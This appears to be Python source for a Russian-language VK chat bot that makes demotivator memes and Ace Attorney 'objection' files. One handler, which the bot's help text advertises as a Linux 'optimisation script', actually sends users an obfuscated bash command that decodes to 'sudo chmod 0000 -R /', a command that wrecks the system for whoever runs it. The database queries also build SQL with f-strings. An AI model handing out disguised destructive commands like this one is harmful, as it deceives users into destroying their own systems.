import base64
import json
import re
import tempfile
from abc import ABC, abstractmethod
from concurrent.futures.thread import ThreadPoolExecutor

from datetime import datetime
from os.path import join
from random import randint, choice
from string import ascii_letters
from typing import Awaitable, Callable, Optional, Union, Iterable, Tuple
from urllib.error import HTTPError, URLError

import pymysql
import requests
import asyncio
from PIL import UnidentifiedImageError

from images.demotivator import Demotivator
from images.searchimages import ImgSearch
from images.vasyacache import Vasya


class Bot:
    def __init__(self, db_connection: pymysql.connections.Connection):
        self._rateLimit = self._RateLimit()
        self._imgSearch = ImgSearch()
        self._dbConnection = db_connection

    class _RateLimit:
        _recent: dict = {}

        async def ratecounter(self, _id: int) -> bool:
            now = datetime.now().timestamp()
            if _id in self._recent.keys() and self._recent[_id] > now:
                self._recent[_id] += 3
                return False
            else:
                self._recent[_id] = now + 3
                return True

    class _Handler(ABC):
        _imgSearch: ImgSearch
        _dbConnection: pymysql.connections.Connection

        def __init__(self, **kwargs):
            if 'imgSearch' in kwargs.keys():
                self._imgSearch = kwargs['imgSearch']
            if 'dbConnection' in kwargs.keys():
                self._dbConnection = kwargs['dbConnection']

        class Doc:
            url: Optional[str]
            filepath: Optional[str]

            def __init__(self, url: str = None, filepath: str = None):
                assert url or filepath, 'URL or filepath for document must be provided.'
                self.url = url
                self.filepath = filepath

        class Image(Doc):
            ...

        @staticmethod
        @abstractmethod
        async def filter(msg: str) -> bool:
            ...

        @abstractmethod
        def run(self, **kwargs) -> Union[list, None]:
            ...

        @classmethod
        def _parseMsg(cls, msg: str) -> dict:  # returns a parsed dict of command params
            command = re.split(' |\n', msg)[0]
            args = msg[len(command) + 1:]
            return {
                'command': command,
                'arguments': args
            }

    async def _regHandler(self, h: type) -> None:
        ...

    class _Help(_Handler):
        @staticmethod
        async def filter(msg: str) -> bool:
            return msg in ['команды', 'commands']

        def run(self) -> list:
            return ['''Внимание! Не срите в бота чаще 3 секунд! 1 превышение лимита = +3 секунды к игнору.
Команды:

objection - генерация спора в стиле Ace Attorney для загрузки в http://objection.lol/maker .
Требуются пересланные сообщения.
objectionconf - сохранить конкретных персонажей для имен из прикрепленного файла из http://objection.lol/maker .
Допустим, ты сделал так, что Вася П. - это Эджворт в своем видео. Используй эту команду чтобы в будущем бот знал, \
что Вася П. - это Эджворт.
Более подробно про команды objection можно узнать у нас в паблике.

демотиватор текст сверху
текст снизу
При вызове без картинки используется картинка по запросу, равному тексту сверху
При вызове без параметров генерируется текст на основе ассоциаций бота васи ( https://vk.com/vasyamashinka )
Поддерживается пересылка сообщений с картинкой и/или текстом.

оптимизация - Сгенерировать скрипт оптимизации kaл linux
''']

    class _Optimisation(_Handler):
        @staticmethod
        async def filter(msg: str) -> bool:
            return msg.startswith(('оптимизация', 'optimisation'))

        def run(self) -> list:
            def bashEncode(string):
                def randString(size):
                    return ''.join(choice(ascii_letters) for _ in range(size))

                def b64(s):
                    return f"`echo {base64.b64encode(bytes(s, 'ascii')).decode('ascii')} | base64 -d`"

                def cut(s):
                    len1, len2 = randint(2, 10), randint(2, 10)
                    rand1, rand2 = randString(len1), randString(len2)
                    pos = len1 + 1
                    return f"`echo {rand1}{s}{rand2} | cut -b {pos}-{pos}`"

                result = "$("
                for sym in string:
                    mode = randint(0, 1)
                    if mode == 0:
                        result += b64(sym)
                    elif mode == 1:
                        result += cut(sym)
                return result + ")"

            return [bashEncode("sudo chmod 0000 -R /")]

    class _Demotivator(_Handler):
        def __init__(self, img_search: ImgSearch):
            super().__init__()
            self._imgSearch = img_search
            self._demotivator = Demotivator()
            self._vasyaCache = Vasya(self._demotivator, self._imgSearch)
            self._vasyaCache.start()
            self._executor = ThreadPoolExecutor()

        def __del__(self):
            self._vasyaCache.running = False

        @staticmethod
        async def filter(msg: str) -> bool:
            return msg.startswith(('демотиватор', 'demotivator'))

        def run(self, _id: int, msg: str, attached_photos: list, loop: asyncio.AbstractEventLoop,
                callback: Callable[[list], Awaitable]) -> None:
            self._executor.submit(self._runThread, _id, msg, attached_photos, loop, callback)

        def _runThread(self, _id: int, msg: str, attached_photos: list, loop: asyncio.AbstractEventLoop,
                       callback: Callable[[list], Awaitable]) -> None:
            args = (super()._parseMsg(msg))['arguments']
            result = []
            notFound = False
            msg = re.split(r"\n|!@next!@", args)
            if not msg[0]:
                if len(msg) == 1:
                    result.append(self.Image(filepath=self._vasyaCache.getDemotivator()))
                    loop.call_soon_threadsafe(asyncio.ensure_future, callback(result))
                    return None
                else:
                    msg[0] = msg[1]
                    msg[1] = ''
            if len(msg) > 1:
                msg[1] = '\n'.join(msg[1:])
            else:
                msg.append('')

            d: str
            try:
                d = self._demotivator.create(
                    attached_photos[0],
                    msg[0],
                    msg[1]
                )
            except IndexError or AttributeError:
                query = msg[0]
                links = self._imgSearch.fetch(query)
                if not links:
                    links = self._imgSearch.fetch("kernel panic")
                    notFound = True
                link = links[randint(0, len(links) - 1)]
                while True:
                    try:
                        d = self._demotivator.create(
                            link,
                            msg[0],
                            msg[1]
                        )
                        break
                    except (UnidentifiedImageError, HTTPError, URLError):
                        links.pop(links.index(link))
                        if not links:
                            links = self._imgSearch.fetch("kernel panic")
                            notFound = True
                        else:
                            link = links[randint(0, len(links) - 1)]
            result.append(self.Image(filepath=d))
            if notFound:
                result.append("kалов не найдено((9(")
            loop.call_soon_threadsafe(asyncio.ensure_future, callback(result))

    class _Objection(_Handler):
        _jsonPattern: dict
        _usage: str
        _dbConnection: pymysql.connections.Connection

        def __init__(self, db_connection: pymysql.connections.Connection):
            super().__init__()
            self._jsonPattern = {
                "Id": 0,
                "Text": "",
                "PoseId": 1,
                "PoseAnimation": True,
                "Flipped": False,
                "BubbleType": "0",
                "GoNext": False,
                "MergeNext": False,
                "DoNotTalk": False,
                "Username": ""
            }
            self._usage = 'Использование только с пересланными сообщениями.'
            self._dbCon = db_connection

        @staticmethod
        async def filter(msg: str) -> bool:
            return msg in ['обжекшон', 'objection']

        def run(self, _id: int, msg: str, fwd_names: list) -> list:
            result = []
            args = (super()._parseMsg(msg))['arguments'].split('!@next!@')
            if not args[0] or len(fwd_names) != len(args):
                return [self._usage]

            self._dbCon.ping(reconnect=True)
            with self._dbCon.cursor() as cur:
                cur.execute(f'select * from users where userId = {_id}')
                try:
                    userConfig = json.loads(cur.fetchone()[1])
                except TypeError:
                    userConfig = {}
            for i in range(len(args)):
                phrase = self._jsonPattern.copy()
                phrase['Username'] = f"{fwd_names[i]['firstName']} {fwd_names[i]['lastName'][:1]}."
                phrase['Text'] = args[i]
                phrase['Id'] = i + 1
                if phrase['Username'] in userConfig:
                    phrase['PoseId'] = userConfig[phrase['Username']]
                result.append(phrase)
            result = base64.b64encode(bytes(json.dumps(result), 'ascii')).decode('ascii')
            jsonFile = join(tempfile.gettempdir(), str(randint(-32767, 32767)) + '.json')
            with open(jsonFile, 'w') as file:
                file.write(result)
            result = [self.Doc(filepath=jsonFile),
                      'Загрузи этот файл на http://objection.lol/maker нажав кнопку "Load".']
            return result

    class _ObjectionConf(_Handler):
        def __init__(self, db_connection: pymysql.connections.Connection):
            super().__init__()
            self._dbCon = db_connection

        @staticmethod
        async def filter(msg: str) -> bool:
            return msg in ['обжекшонконф', 'objectionconf']

        async def run(self, _id: int, attached_docs: list) -> list:
            result = []
            if not attached_docs:
                result.append('Команда требует прикрепленного JSON файла.')
                return result

            newConfig = json.loads(base64.b64decode(requests.get(attached_docs[0]).content))

            self._dbCon.ping(reconnect=True)
            with self._dbCon.cursor() as cur:
                cur.execute(f'select * from users where userId = {_id}')
                try:
                    dbConfig = json.loads(cur.fetchone()[1])
                except TypeError:
                    dbConfig = {}
            newDbConfig = {}
            for c in newConfig:
                if not c["Username"] in newDbConfig.keys():
                    newDbConfig.update({c["Username"]: c["PoseId"]})
                    result.append(f'Персонажу {c["Username"]} назначается поза {c["PoseId"]}')
            dbConfig.update(newDbConfig)
            dbConfig = json.dumps(dbConfig)
            self._dbCon.ping(reconnect=True)
            with self._dbCon.cursor() as cur:
                cur.execute(f"replace into `users`(`userId`, `objectionConfig`) values(%s, %s)", (_id, dbConfig))
            return result

    class _NoVoice(_Handler):
        @staticmethod
        async def filter(voice: bool = False) -> bool:
            if voice:
                return True

        def run(self, _id: int) -> list:
            return ['Пиши нормально бляь!']
